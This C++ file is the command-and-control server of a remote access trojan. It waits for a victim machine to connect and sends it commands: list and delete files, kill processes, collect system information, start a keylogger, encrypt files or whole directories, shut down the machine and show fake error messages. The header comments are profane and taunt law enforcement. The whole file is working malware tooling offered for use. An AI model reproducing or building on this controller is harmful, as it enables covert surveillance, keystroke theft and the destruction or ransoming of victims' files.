/*
 * WARNING!
 * данное програмное обеспечение является полной собственностью автора
 * Copyright (c) 2019-2020 by Nikait
 * не предназначено для тупых школьников
 * coded by govnocoder na poscale
 * FSB and FBR suck my dick bitch
 *
 * server part
 *
 * compile for linux:
 * g++ Server.cpp -w
*/


#ifdef __linux__
	#define WIN 0
	#include <arpa/inet.h>
	#include <unistd.h>
	#include <stdlib.h>

	#include "Menu.cpp"
#else
	#include <winsock2.h>
	#include <windows.h>
	#pragma comment(lib, "ws2_32.lib")
	#pragma warning(disable: 4996)
#endif



#include <iostream>
#include <string>

#include "Menu.h"
#include "Config.h"


char buffer[100000];
std::string command, path, key;



int main() {
#ifdef __linux__
	system("clear");
#else
	system("cls");
#endif

	PrintGreeting();

#ifndef __linux__
	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	if (WSAStartup(DLLVersion, &wsaData) != 0) {
		std::cout << "Error WSAStartup\n";
		exit(1);
	}

	SOCKADDR_IN addr;
	int sizeofaddr = sizeof(addr);
	addr.sin_addr.s_addr = inet_addr(IP);
	addr.sin_port = htons(PORT);
	addr.sin_family = AF_INET;
	
	SOCKET sListen = socket(AF_INET, SOCK_STREAM, NULL);
	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
	listen(sListen, SOMAXCONN);

	std::cout << "["; timenow(); std::cout << "]" << " platform: windows\n";
	std::cout << "["; timenow(); std::cout << "]" << " [start] server " << IP << ":" << PORT << std::endl;
	std::cout << "["; timenow(); std::cout << "]" << " listening ...\n";
	SOCKET conn = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr);
	
#elif __linux__
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr.s_addr = inet_addr(IP);
	bind(sock, (struct sockaddr*)&addr, sizeof(addr));
	listen(sock, 1);
	std::cout << "["; timenow(); std::cout << "]" << " platform: linux\n";
	std::cout << "["; timenow(); std::cout << "]" << " [start] server " << IP << ":" << PORT << std::endl;
	std::cout << "["; timenow(); std::cout << "]" << " listening ...\n";
	int conn = accept(sock, (struct sockaddr *) NULL, NULL);
	
#endif

	if (!conn) {
		std::cout << "Error accept\n";
		return -1;
	}
	else {
		std::cout << "["; timenow(); std::cout << "]" << " Sucessful Connected!\ntype help to print HELP [MENU]\n";
		while (true) {
			memset(&buffer, 0x0, sizeof(buffer));
			std::cout << "["; timenow(); std::cout << "]" << " command => ";
			std::getline(std::cin, command);

			if (command == "ls") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter path => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "rm") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter path => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "rmdir") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter path => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "sysinfo") {
				std::cout << "please, wait ...\n";
				send(conn, command.c_str(), sizeof(command), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "ps") {
				send(conn, command.c_str(), sizeof(command), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "kill") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter name => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "pwd") {
				send(conn, command.c_str(), sizeof(command), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}
			
			else if (command == "keylogger") {
				send(conn, "keylogger", sizeof("keylogger"), NULL);
				std::cout << "how many characters should record? => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				std::cout << "activate keylogger!\nwait ...\n";
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "cryptfile") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "path to file => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), path.length(), NULL);
				std::cout << "key (int 1-25) => ";
				std::getline(std::cin, key);
				send(conn, key.c_str(), sizeof(key), NULL);
				std::cout << "wait ...\n";
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "cryptdir") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "path to directory => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), path.length(), NULL);
				std::cout << "key (int 1-100) => ";
				std::getline(std::cin, key);
				send(conn, key.c_str(), sizeof(key), NULL);
				std::cout << "wait ...\n";
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "shutdown") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "ok\n";
			}

			else if (command == "error") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter name error => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				std::cout << "ok\n";
			}

			else if (command == "close") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "["; timenow(); std::cout << "]" << " close connection";
				return 1;
			}

			else if (command == "help") {
				HelpMenu();
			}

			else std::cout << "command not found\n";
		}
	}
	return 0;
}